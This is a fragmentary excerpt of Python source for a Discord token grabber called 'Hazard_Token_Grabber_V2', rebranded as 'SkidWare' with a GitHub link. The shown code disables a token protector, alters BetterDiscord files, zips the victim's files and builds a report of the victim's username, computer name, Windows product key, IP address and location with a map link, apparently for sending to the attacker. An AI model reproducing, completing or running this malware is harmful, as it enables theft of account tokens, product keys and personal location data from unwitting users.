...
class Hazard_Token_Grabber_V2(functions):
                ...
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                    ...
                    if x:
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Stolen by SkidWare | https://github.com/NotJINXZ/SkidWare-Nuker\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x+"\n\nStolen by SkidWare | https://github.com/NotJINXZ/SkidWare-Nuker")
                    else:
                        try:
    ...
    def bypassTokenProtector(self):
        ...
        try:
            ...
            with open(config, 'a') as f:
                f.write("\n\n//SkidWare just shit on this token protector.")
        except Exception:
            pass
    ...
    def bypassBetterDiscord(self):
        ...
        if os.path.exists(bd):
            ...
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'SkidWareOnTop')
    ...
    def SendInfo(self):
        ...
        try:
            ...
            pass
        _zipfile = os.path.join(self.appdata, f'SkidWare-[{os.getlogin()}].zip')
        ...
        embed = {
            ...
            "embeds": [
                {
                    "author": {
                        "name": "SkidWare Token Grabber",
                        "url": "https://github.com/NotJINXZ/SkidWare-Nuker",
                        "icon_url": ""
                    },
                    "description": f'**{os.getlogin()}** Just ran SkidWare Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,
                    ...
                    "footer": {
                      "text": "Gh0st JINXZ#3697 https://github.com/NotJINXZ/SkidWare-Nuker"
                    }
                }
            ]
        }
